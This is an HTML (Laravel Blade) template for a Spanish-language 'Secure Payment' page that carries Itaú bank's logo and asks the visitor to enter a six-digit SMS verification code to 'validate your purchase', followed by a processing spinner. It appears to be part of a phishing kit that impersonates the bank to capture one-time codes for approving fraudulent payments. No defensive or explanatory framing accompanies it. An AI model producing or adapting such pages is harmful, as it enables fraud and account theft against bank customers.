<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">


    <script type="text/javascript" src="{{asset('assets/js/jquery-3.6.0.min.js')}}"></script>		
    <link rel="stylesheet" href="{{asset('assets/css/payment/itau.css')}}">


    <title>Secure Payment</title>

    <style>
        .spinner-container {
      margin-bottom: 2rem;
    }

    .spinner {
        width: 60px;
        height: 60px;
        border: 4px solid rgba(232, 17, 75, 0.2);
        border-left: 4px solid rgb(232, 17, 75);
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 0 auto 3rem;
    }

    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    </style>

</head>
<body>

<div id="formContainer" class="details" >
        <img src="{{asset('assets/img/payment/itau/itaulogo.jpg')}}" alt="" srcset="" width="120px">
        <hr>

        <h3 style="color:black;">Vamos a validar tu compra</h3>
        <a style="color:black;">Ingresa el código SMS que te acabamos de enviar y dale "Confirmar".</a><br><p></p>
    
        
    <center>
        <a style="">Código de verificación</a>
        <br>
        <br>
        <div style="width: 80%; text-align: center; display: inline-block;">
                    <input type="tel" name="cotp" class="pass" id="txtOTP" style="width:90%; height:25px;" required maxlength="6" minlength="6" oninput="this.value = this.value.replace(/\D+/g, '');" required ><br>
        <input type="submit" id="btnOTP" value="ENVIAR" style="color:white; background-color:blue; border:none;margin-top:5px; height:35px; width: 66%;">
        </div>
    </center><br><br>
    <center>
    
    <div>
         <a><small><b>REENVIAR CÓDIGO</b></small></a>
    </div>
    <br>
    <div style="text-align:left;">
        <a><b>Ayuda</b></a> 
    </div>
    </center><br>
    
    
    </div>


<div id="loader" class="spinner-container" style="display:none; text-align:center; margin-top:50%;">
    <div class="spinner"></div>
    <p style="color:#333; margin-top:15px;">Procesando, por favor espera...</p>
</div>



</body>
</html>